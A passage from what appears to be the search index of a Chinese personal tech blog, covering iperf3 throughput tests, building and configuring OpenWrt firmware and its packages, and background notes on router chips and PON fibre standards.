Mbits/sec                  receiver\n\n(base) yfy@Tianyi \u279c  ~ iperf3 -c 192.168.36.2 -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.09 GBytes   940 Mbits/sec    0             sender\n[  5]   0.00-10.00  sec  1.09 GBytes   939 Mbits/sec                  receiver\n</code></pre> <p>wg \u590d\u7528\u4e4b\u524d\u7684 home \u5230\u5b66\u6821\u6570\u636e baseline\uff1aipv6 \u76f4\u8fde</p> <pre><code>home\u4e0b\u8f7d\n[SUM]   0.00-10.00  sec   798 MBytes   669 Mbits/sec  468             sender\n[SUM]   0.00-10.05  sec   786 MBytes   656 Mbits/sec                  receiver\n\nhome\u4e0a\u4f20\n[SUM]   0.00-10.06  sec   925 MBytes   771 Mbits/sec  1185             sender\n[SUM]   0.00-10.00  sec   918 MBytes   770 Mbits/sec                  receiver\n</code></pre> <pre><code>\u279c  ~ iperf3 -c op3\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   163 MBytes   137 Mbits/sec    0             sender\n[  5]   0.00-10.05  sec   161 MBytes   134 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -P 5\n[SUM]   0.00-10.00  sec   537 MBytes   450 Mbits/sec  302             sender\n[SUM]   0.00-10.06  sec   525 MBytes   438 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.05  sec   235 MBytes   196 Mbits/sec  170             sender\n[  5]   0.00-10.00  sec   234 MBytes   196 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -R -P 5\n[SUM]   0.00-10.05  sec   504 MBytes   421 Mbits/sec    0             sender\n[SUM]   0.00-10.00  sec   497 MBytes   417 Mbits/sec                  receiver\n</code></pre> <p>\u6050\u6016\u7684 CPU \u5360\u7528 </p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/","title":"openwrt \u7f16\u8bd1","text":"<p>openwrt \u7f16\u8bd1</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-\u7f16\u8bd1","title":"Openwrt \u7f16\u8bd1","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u81ea\u5df1\u7f16\u8bd1\u4f18\u70b9","title":"\u81ea\u5df1\u7f16\u8bd1\u4f18\u70b9","text":"<ol> <li>\u56fa\u4ef6\u4f53\u79ef\u51cf\u5c0f\uff08\u9700\u8981\u5b89\u88c5\u7684 package \u88ab\u538b\u7f29\u5230\u955c\u50cf\u4e2d\uff09</li> <li>\u53ef\u4ee5\u5b9a\u5236\u4e00\u4e9b\u9700\u8981\u7684\u9009\u9879\uff08busybox \u53ef\u4ee5\u9009\u62e9 zsh\uff09</li> <li>\u4e0b\u6b21\u5237\u673a\uff0c\u53ef\u4ee5\u4e0d\u7528\u8fdb\u884c\u8f6f\u4ef6\u5b89\u88c5\uff0c\u914d\u7f6e</li> </ol> <p>The main advantage of building your own firmware is that it compresses the files, so that you will have room for much more stuff. It is particularly noticeable on routers with 16 MB flash RAM or less. It also lets you change some options that can only be changed at build time, for instance the features included in BusyBox and the block size of SquashFS. Larger block size will give better compression, but may also slow down the loading of files. (ref: [OpenWrt Wiki] Quick image building guide)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-build-system-\u7279\u70b9","title":"Openwrt Build System \u7279\u70b9","text":"<ul> <li>\u4e0d\u7528\u914d\u7f6e\u7f16\u8bd1\u94fe</li> </ul> <p>While it is possible to manually create your toolchain, and then build OpenWrt with it, this is difficult and error-prone. The OpenWrt build system takes a different approach to building a firmware: it downloads, patches and compiles everything from scratch, including the cross compiler. Or to put it in simpler terms, OpenWrt's build system doesn't contain any executables or even sources. It is an automated system for downloading the sources, patching them to work with the given platform and compiling them correctly for the platform. What this means is that just by changing the template, you can change any step in the process. And of course the side benefit of this is that builds are automated, which saves time and guarantees the same result every time. For example if a new kernel is released, a simple change to one of the Makefiles will download the latest kernel, patch it to run on the requested platform and produce a new firmware image. There's no work to be done trying to track down an unmodified copy of the existing kernel to see what changes had been made - the patches are already provided and the process ends up almost completely transparent. This doesn't just apply to the kernel, but to anything included with OpenWrt - it's this strategy that allows OpenWrt to stay on the bleeding edge with the latest compilers, kernels and applications. (ref: [OpenWrt Wiki] Build system essentials)</p> <ul> <li>\u7f16\u8bd1\u51fa\u6765\u7684 toolchain \u4f4d\u7f6e</li> </ul> <p><code>staging_dir/toolchain\u2026</code> is a mini Linux root with its own <code>bin/</code>, <code>lib/</code>, etc that contains the cross C compiler used to build the rest of the firmware. You can actually use that to compile simple C programs outside of OpenWRT that can be loaded onto the firmware. The C compiler might be something like: <code>staging_dir/toolchain-mips_34kc_gcc-4.8-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux-uclibc-gcc</code>. You can see the version of the CPU, the C library and gcc encoded into it; this allows multiple targets to be built in the same area concurrently.</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-git-\u5206\u652f","title":"openwrt git \u5206\u652f","text":"<p>\u56fe\u4e2d\u84dd\u8272\u4e3a master \u5206\u652f\uff0c\u7eff\u8272\u4e3a 21.02 \u7a33\u5b9a\u7248\u5206\u652f\uff0c\u6a59\u8272\u4e3a LEDE19.07 \u5206\u652f\uff0c\u800c\u7c89\u8272\u7684\u4e3a\u65b0\u7684 22.03 \u6d4b\u8bd5\u7248\u5206\u652f\u3002\u53ef\u4ee5\u770b\u5230 AX6S \u6700\u65e9\u5728 master \u5206\u652f\u4e2d\u5f97\u5230\u652f\u6301\uff0c\u7136\u540e\u4e0d\u4e45\u4fbf\u5728 22.03 \u4e2d\u5f97\u5230\u4e86\u6dfb\u52a0\u3002</p> <ul> <li>\u597d\u5947\u4e3a\u4f55\u4e0d\u4f7f\u7528 merge </li> </ul> <p>21.02 \u7a33\u5b9a\u7248\u5206\u652f\uff0c\u5f53\u521d\u4e5f\u662f\u4ece master \u5206\u652f\u4e2d\u5206\u79bb\u51fa\u6765\u7684</p> <p></p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#immortalwrt","title":"immortalwrt","text":"<ul> <li>immortalwrt/immortalwrt: An opensource OpenWrt variant for mainland China users. (github.com) \u6709\u4ee5\u4e0b\u8fd9\u4e9b\u5206\u652f\u3002\u5f00\u53d1\u6d41\u7a0b\u4e3a\u5c06\u5b98\u65b9\u5206\u652f\u5408\u5e76\u5230\u81ea\u5df1\u7684\u5206\u652f\u3002\u4f46\u662f 21.02 \u7a33\u5b9a\u7248\u4ecd\u7136\u6ca1\u6709 AX6S \u7684\u652f\u6301\uff0c\u7f51\u4e0a\u770b\u5230\u7684\u662f 18.06-k5.4 \u5206\u652f\u7684</li> <li>AX6S \u95ed\u6e90\u65e0\u7ebf\u9a71\u52a8 Openwrt \u5237\u673a\u6559\u7a0b/\u56fa\u4ef6\u4e0b\u8f7d - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul> <pre><code>* openwrt-21.02\n  remotes/origin/HEAD -&gt; origin/openwrt-21.02\n  remotes/origin/master\n  remotes/origin/openwrt-18.06\n  remotes/origin/openwrt-18.06-k5.4\n  remotes/origin/openwrt-21.02\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1\u547d\u4ee4","title":"\u7f16\u8bd1\u547d\u4ee4","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u4f9d\u8d56","title":"\u4f9d\u8d56","text":"<p>\u6839\u636e[OpenWrt Wiki] Build system setup \u5b89\u88c5\u5bf9\u5e94</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<ul> <li>\u53c2\u8003\uff1a<ul> <li>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Build system usage</li> <li>\u975e\u5e38\u597d\u7684\u4e00\u4e2a\u6559\u7a0b\uff1aHow To Compile OpenWrt Firmware For Any Router \u00b7 GitHub</li> </ul> </li> <li> <p>\u547d\u4ee4\u6c47\u603b</p> <pre><code># Download and update the sources\ngit clone https://git.openwrt.org/openwrt/openwrt.git\ncd openwrt\ngit pull\n\n# Select a specific code revision\ngit branch -a\ngit tag\ngit checkout v21.02.1\n\n# Update the feeds\n./scripts/feeds update -a\n./scripts/feeds install -a\n\n# Configure the firmware image and the kernel\nmake menuconfig\n#make kernel_menuconfig\n\n#download all dependency source files before final make, enables multi-core compilation\nmake download\n\n# Build the firmware image\n#make (or make world)\n#when faild, V=s show all command executed\n#make V=s\n\nmake -j $(nproc) 2&gt;&amp;1 | teemake.log\n</code></pre> </li> </ul> <ul> <li> <p>Cleaning Up</p> <pre><code>make clean #deletes contents of the directories /bin and /build_dir. make clean does not remove the toolchain, it also avoids cleaning architectures/targets other than the one you have selected in your .config\n\nmake dirclean #deletes contents of the directories /bin and /build_dir and additionally /staging_dir and /toolchain (=the cross-compile tools) and /logs. 'Dirclean' is your basic \"Full clean\" operation.\n\nmake distclean #nukes everything you have compiled or configured and also deletes all downloaded feeds contents and package sources.\n\n#clean small part\nmake target/linux/clean    #Clean linux objects \nmake package/base-files/clean  #Clean package base-files objects\nmake package/luci/clean   #Clean luci\n</code></pre> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1\u914d\u7f6e","title":"\u7f16\u8bd1\u914d\u7f6e","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#menuconfig","title":"menuconfig","text":"<ul> <li>Target System(MediaTek Ralink MIPS)</li> <li>Subtarget(MT7621 based boards)</li> <li>Target Profile(Xiaomi Redmi Router AC2100)</li> <li>Target Images<ul> <li>\u53d6\u6d88\u52fe\u9009 ramdisk\uff0c\u5426\u8005\u4f1a\u751f\u6210<code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-initramfs-kernel.bin</code></li> <li>\u52fe\u9009 squashfs\uff0c\u53ef\u4ee5\u8c03\u8282 block size\uff08\u9ed8\u8ba4 256B\uff09\uff0c\u8d8a\u5927\u7684\u5757\u538b\u7f29\u7387\u66f4\u597d\uff0c\u4f46\u8bfb\u53d6\u901f\u5ea6\u66f4\u6162\uff08\u53ef\u80fd\u5f71\u54cd\u91cd\u542f\u901f\u5ea6\uff1f\uff09</li> </ul> </li> <li>Build the Openwrt SDK\uff1a\u4e00\u4e2a\u5c0f\u7684 buildroot\uff0c\u7528\u4e8e\u6d4b\u8bd5\u81ea\u5df1\u7684 package</li> <li>Package the Openwrt-based Toolchain\uff1a\u4ea4\u53c9\u7f16\u8bd1\u94fe</li> <li>Base system<ul> <li>\u4f7f\u7528 Openclash \u9700\u8981\u53d6\u6d88\u52fe\u9009 dnsmasq\uff08\u5df2\u7ecf\u52fe\u9009 dnsmasq-full\uff09</li> <li>\u4e2d\u6587\u4e71\u7801\uff1amake menuconfig-&gt;Base System-&gt;busybox-&gt;Customize busybox option-&gt;Settings-&gt;support unicode \u9009\u9879\uff08\u4f4d\u4e8e\u7ed3\u5c3e\uff09\u52fe\u4e0a\u540e\uff0c\u52fe\u4e0a\u9009\u9879 Check $LANG environment variable</li> </ul> </li> <li>Administration<ul> <li>htop</li> </ul> </li> <li>Development<ul> <li>gcc, gdb \u7b49\u5de5\u5177</li> </ul> </li> <li>Fonts<ul> <li>DejaVu \u5b57\u4f53</li> </ul> </li> <li>Kernel modules<ul> <li>Other modules: kmod-mtd-rw\uff1a\u5f00\u542f uboot \u7b49 flash \u5206\u533a\u5199\u6743\u9650</li> <li>USB support: <code>kmod-usb-core kmod-usb-storage kmod-usb-uhci kmod-usb2 kmod-usb3</code></li> <li>Video support: kmod-video-core kmod-video-uvc</li> </ul> </li> <li>Languages<ul> <li>python\uff1arequests, lxml</li> </ul> </li> <li>Luci<ul> <li>Collections<ul> <li>Luci\uff1a\u5426\u5219\u6ca1\u6709\u56fe\u5f62\u754c\u9762</li> </ul> </li> <li>Module<ul> <li>luci-compat\uff1a\u636e\u8bf4\u662f\u5fc5\u8981\u7684</li> </ul> </li> <li>Application<ul> <li>adblock</li> <li>ddns</li> <li>Openclash\uff08\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</li> <li>qos</li> <li>samba4: usb\uff08\u9700\u8981 usb \u6302\u8f7d\u4e1c\u897f\u7684\u8bdd\uff09</li> <li>upnp</li> <li>wireguard</li> <li>wol</li> </ul> </li> </ul> </li> <li>Network<ul> <li>Files Transfer: curl</li> <li>VPN: zerotier</li> <li>immortalwrt \u9700\u8981\u5f00\u542f: odhcp6c, odhcpd-ipv6only\uff0c\u5426\u5219 ipv6 \u65e0\u6cd5\u4f7f\u7528</li> <li>WirelessPAD:<ul> <li>wpad-openssl\uff1a\u6700\u5b8c\u6574</li> <li>wpad-mesh-openssl</li> <li>wpad-basic-openssl</li> </ul> </li> </ul> </li> <li>Utilities<ul> <li>Editors\uff1avim-full\uff08\u53ea\u80fd\u9009\u4e00\u4e2a\uff09</li> <li>Shells\uff1abash, zsh</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#usb","title":"usb","text":"<pre><code>#kmod &gt; usb support\nkmod-usb-core kmod-usb-storage kmod-usb-uhci kmod-usb2 kmod-usb3\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#webcam","title":"webcam","text":"<pre><code>#kmod &gt; video support\nkmod-video-core kmod-video-uvc\n\n#Multimedia\nmjpg-streamer\ninput-uvc\noutput-rtsp\nwww-simple\n\n#luci\nluci-app-mjpg-streamer\n\n#utils(optional)\nuvcdynctrl\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#opkg-\u5b89\u88c5\u5176\u5b83\u8f6f\u4ef6","title":"opkg \u5b89\u88c5\u5176\u5b83\u8f6f\u4ef6","text":"<p>\u5fc5\u5907</p> <pre><code>opkg install zerotier luci-app-wireguard luci-app-ddns\n</code></pre> <p>\u6709\u7528</p> <pre><code>opkg install htop vim-full curl bind-dig mtr-json tmux iperf3 tcpdump \n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#mesh","title":"mesh","text":"<pre><code>opkg list-installed |grep wpad\nopkg remove wpad-basic-wolfssl #\u4e0a\u4e00\u6b65\u8f93\u51fa\nopkg install wpad-mesh-openssl\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#immortalwrt_1","title":"immortalwrt","text":"<p>interface wan6 \u663e\u793a\u4e0d\u652f\u6301\u7684\u534f\u8bae\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5\u4ee5\u4e0b\u8f6f\u4ef6\uff0c\u5e76 restart network</p> <pre><code>odhcp6c odhcpd-ipv6only\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u95ed\u6e90\u9a71\u52a8","title":"\u95ed\u6e90\u9a71\u52a8","text":"<p>\u770b\u5230\u5f88\u591a\u975e openwrt \u5b98\u65b9\u56fa\u4ef6\u90fd\u63d0\u5230\u4e86\u95ed\u6e90\u9a71\u52a8\u56e0\u6b64\u4e86\u89e3\u4e86\u4e00\u6ce2 \u5927\u6982\u5c31\u662f MTK \u6709 mt76 \u65e0\u7ebf\u7684\u9a71\u52a8\u4ee3\u7801\uff0c\u4f46\u662f openwrt \u5185\u4f7f\u7528\u7684\u662f\u81ea\u5df1\u5f00\u53d1\u7684\u9a71\u52a8\u3002 Mt76 driver - replacement [for test] - For Developers - OpenWrt Forum openwrt/feeds/mtk-openwrt-feeds - Gitiles (mediatek.com)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u8bb0\u5f55","title":"\u8bb0\u5f55","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u65e0-5ghz-\u65e0\u7ebf","title":"\u65e0 5Ghz \u65e0\u7ebf","text":"<p>\u521a\u5f00\u59cb\u7f16\u8bd1\u4e86 rm2100\uff0cmake clean \u540e\uff0c\u7f16\u8bd1\u4e86 r3g\u3002\u7ed3\u679c\u53d1\u73b0\u4e00\u5207\u90fd\u597d\uff0c\u5c31\u662f\u6ca1\u6709 5Ghz \u65e0\u7ebf\u3002\u800c\u4f7f\u7528\u5b98\u65b9\u7248\u672c\u662f\u6709\u7684\u3002 \u5c1d\u8bd5 make dirclean \u540e (full clean)\uff0c\u91cd\u65b0\u7f16\u8bd1\uff0c\u95ee\u9898\u89e3\u51b3\u3002</p> <p>\u53d1\u73b0\u5728\u4e0d\u540c\u8bbe\u5907\u4e0a\u90fd\u9047\u5230\u8fc7\u8fd9\u4e2a\u95ee\u9898\uff0c\u6682\u4e0d\u6e05\u695a\u662f\u54ea\u4e00\u6b65\u5bfc\u81f4\u7684</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u6d4b\u901f\u901f\u5ea6\u6162","title":"\u6d4b\u901f\u901f\u5ea6\u6162","text":"<p>\u6d4b\u901f\u4e0a\u4f20\u4e0b\u8f7d\u90fd\u662f 300 \u5de6\u53f3 \u5c1d\u8bd5\u4fdd\u5b58\u914d\u7f6e\u540e\uff0c\u5728\u7cfb\u7edf\u4e2d reset\uff0c\u7136\u540e\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u3002</p> <ul> <li>reset \u540e\uff0c\u901f\u5ea6\u5f88\u5feb\uff0c\u57fa\u672c\u4e0a\u4e0a\u4f20\u53ef\u4ee5\u5230 600-700\uff0c\u4e0b\u8f7d 900-1000</li> <li>\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u540e\uff0c\u901f\u5ea6\u4f9d\u65e7\u5f88\u5feb</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/","title":"openwrt \u8def\u7531\u5668\u9009\u62e9","text":"<p>\u8bb0\u5f55\u4e0b\u81ea\u5df1\u4e0d\u540c\u65f6\u671f\uff0c\u8d2d\u5165\u8def\u7531\u5668\u786c\u4ef6\u65f6\u7684\u8c03\u7814</p> <p>\u53d1\u73b0\u76f4\u63a5\u770b\u8fd9\u91cc\uff0c\u5c31\u6709\u63a8\u8350\u7684\u6027\u4ef7\u6bd4\u8def\u7531\u5668\uff1a\u7279\u4ef7\u8def\u7531\u6c47\u603b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u8def\u7531\u5668\u76f8\u5173\u77e5\u8bc6","title":"\u8def\u7531\u5668\u76f8\u5173\u77e5\u8bc6","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u57fa\u5e26\u5c04\u9891fem\u82af\u7247","title":"\u57fa\u5e26\u3001\u5c04\u9891\u3001FEM\u82af\u7247","text":"<p>by chatgpt o4</p> <ul> <li>\u57fa\u5e26\u82af\u7247\uff08Baseband Chip\uff09\uff1a\u8d1f\u8d23\u5904\u7406\u6240\u6709\u7684\u6570\u5b57\u4fe1\u53f7\u5904\u7406\u4efb\u52a1\u3002\u5b83\u5c06\u4ece\u9ad8\u5c42\u534f\u8bae\u4e2d\u63a5\u6536\u5230\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u9002\u5408\u53d1\u9001\u7684\u4fe1\u53f7\uff0c\u540c\u65f6\u89e3\u7801\u63a5\u6536\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u57fa\u5e26\u5904\u7406\u5305\u62ec\u8c03\u5236\u3001\u7f16\u7801\u3001\u52a0\u5bc6\u7b49\u64cd\u4f5c\uff0c\u662f\u4fe1\u53f7\u4ece\u6570\u5b57\u6570\u636e\u5230\u65e0\u7ebf\u7535\u4fe1\u53f7\u548c\u4ece\u65e0\u7ebf\u7535\u4fe1\u53f7\u56de\u5230\u6570\u5b57\u6570\u636e\u7684\u6865\u6881\u3002</li> </ul> <ul> <li>\u5c04\u9891\u82af\u7247\uff08RF Chip\uff09\uff1a\u8d1f\u8d23\u65e0\u7ebf\u4fe1\u53f7\u7684\u53d1\u5c04\u548c\u63a5\u6536\u3002\u5c04\u9891\u82af\u7247\u5904\u7406\u4fe1\u53f7\u7684\u8c03\u5236\u548c\u89e3\u8c03\uff0c\u5c06\u57fa\u5e26\u82af\u7247\u5904\u7406\u8fc7\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u53ef\u901a\u8fc7\u5929\u7ebf\u53d1\u5c04\u7684\u9ad8\u9891\u7535\u78c1\u6ce2\uff0c\u540c\u65f6\u5c06\u4ece\u5929\u7ebf\u63a5\u6536\u5230\u7684\u4fe1\u53f7\u8f6c\u6362\u56de\u4f9b\u57fa\u5e26\u82af\u7247\u5904\u7406\u7684\u4fe1\u53f7\u3002\u5c04\u9891\u90e8\u5206\u5305\u62ec\u653e\u5927\u3001\u6ee4\u6ce2\u548c\u9891\u7387\u5408\u6210\u7b49\u64cd\u4f5c\u3002</li> </ul> <p>\u6570\u636e\u94fe\u8def\u5c42\u548c\u8fd9\u4e9b\u82af\u7247\u7684\u5173\u7cfb</p> <p>\u6570\u636e\u94fe\u8def\u5c42\uff08\u5305\u62ec MAC \u5c42\uff09\u4f4d\u4e8e\u57fa\u5e26\u82af\u7247\u7684\u4e0a\u65b9\uff0c\u8d1f\u8d23\u5904\u7406\u6570\u636e\u5e27\u7684\u7ec4\u88c5\u3001\u63a7\u5236\u548c\u53d1\u9001\u3002\u800c\u57fa\u5e26\u82af\u7247\u548c\u5c04\u9891\u82af\u7247\u5219\u4f4d\u4e8e\u66f4\u4f4e\u7684\u7269\u7406\u5c42\uff0c\u5b9e\u73b0\u5b9e\u9645\u7684\u4fe1\u53f7\u4f20\u8f93\u548c\u63a5\u6536\u3002</p> <ul> <li>MAC \u5c42\u548c\u57fa\u5e26\u82af\u7247\uff1aMAC \u5c42\u63a7\u5236\u6570\u636e\u7684\u4f20\u8f93\u903b\u8f91\uff0c\u57fa\u5e26\u82af\u7247\u6267\u884c\u6570\u636e\u8c03\u5236\u3001\u7f16\u7801\u4ee5\u53ca\u4ece\u6570\u636e\u94fe\u8def\u5c42\u5230\u7269\u7406\u5c42\u7684\u4fe1\u53f7\u8f6c\u6362\u3002</li> <li>\u5c04\u9891\u82af\u7247\uff1a\u7269\u7406\u5c42\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u5904\u7406\u65e0\u7ebf\u4fe1\u53f7\u7684\u7269\u7406\u4f20\u8f93\uff0c\u901a\u8fc7\u5929\u7ebf\u8fdb\u884c\u65e0\u7ebf\u7535\u4fe1\u53f7\u7684\u53d1\u5c04\u548c\u63a5\u6536\u3002</li> </ul> <p>FEM \u82af\u7247\uff08Front-End Module\uff09 FEM \u82af\u7247\u7684\u4f5c\u7528\u662f\u4f18\u5316\u4fe1\u53f7\u7684\u53d1\u5c04\u548c\u63a5\u6536\u8d28\u91cf\uff0c\u964d\u4f4e\u566a\u58f0\u3001\u589e\u5f3a\u4fe1\u53f7\u529f\u7387\uff0c\u5e76\u786e\u4fdd\u9891\u7387\u9009\u62e9\u7684\u7cbe\u786e\u6027\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u5149\u732b-epon-gpon-xg-pon","title":"\u5149\u732b EPON, GPON, XG-PON","text":"<p>\u88ab\u52a8\u5149\u7f51\u7edc\uff08PON\uff09</p> <ul> <li>XG-PON<ul> <li>XG-PON \u662f 10G PON \u7684\u6807\u51c6\u4e4b\u4e00\uff0c\u5168\u79f0\u4e3a 10G GPON\u3002</li> <li>\u5b83\u662f GPON\uff08Gigabit Passive Optical Network\uff09\u7684\u5347\u7ea7\u7248\u672c\uff0c\u63d0\u4f9b\u9ad8\u8fbe 10 Gbps \u7684\u4e0b\u884c\u901f\u7387\u548c 2.5 Gbps \u7684\u4e0a\u884c\u901f\u7387\u3002</li> </ul> </li> <li>EPON<ul> <li>EPON \u57fa\u4e8e\u4ee5\u592a\u7f51\u6280\u672f\uff0c\u5168\u79f0\u4e3aEthernet Passive Optical Network</li> <li>\u5b83\u662f IEEE 802.3 \u6807\u51c6\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u5bf9\u79f0\u7684 1 Gbps \u4e0a\u884c\u548c\u4e0b\u884c\u901f\u7387\u3002</li> <li>EPON \u6bd4 GPON 